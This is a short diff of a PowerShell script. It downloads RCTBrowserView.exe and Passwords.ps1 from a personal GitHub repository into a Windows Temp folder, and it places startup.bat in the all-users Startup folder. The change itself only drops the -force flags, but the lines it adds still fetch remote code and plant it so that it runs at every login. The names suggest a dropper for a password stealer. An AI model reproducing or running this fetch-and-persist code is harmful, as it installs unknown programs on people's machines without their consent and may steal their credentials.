@@ -42,11 +42,11 @@ if (Test-Path -path $software) {
 
 # Copy Zip to local machine
 
-Invoke-WebRequest -Uri "https://github.com/DemonicDorx/temp/blob/main/RCTBrowserView.exe" -Outfile 'C:\Windows\Temp\JuansFamousFriedChicken\RCTBrowserView.exe' -force
+Invoke-WebRequest -Uri "https://github.com/DemonicDorx/temp/blob/main/RCTBrowserView.exe" -Outfile 'C:\Windows\Temp\JuansFamousFriedChicken\RCTBrowserView.exe'
 
-Invoke-WebRequest -Uri 'https://github.com/DemonicDorx/temp/blob/main/startup.bat' -Outfile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\startup.bat' -force
+Invoke-WebRequest -Uri 'https://github.com/DemonicDorx/temp/blob/main/startup.bat' -Outfile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\startup.bat'
 
-Invoke-WebRequest -Uri "https://github.com/DemonicDorx/temp/blob/main/Passwords.ps1" -Outfile 'C:\Windows\Temp\JuansFamousFriedChicken\Passwords.ps1' -force
+Invoke-WebRequest -Uri "https://github.com/DemonicDorx/temp/blob/main/Passwords.ps1" -Outfile 'C:\Windows\Temp\JuansFamousFriedChicken\Passwords.ps1'
 
 "Software copied"
 
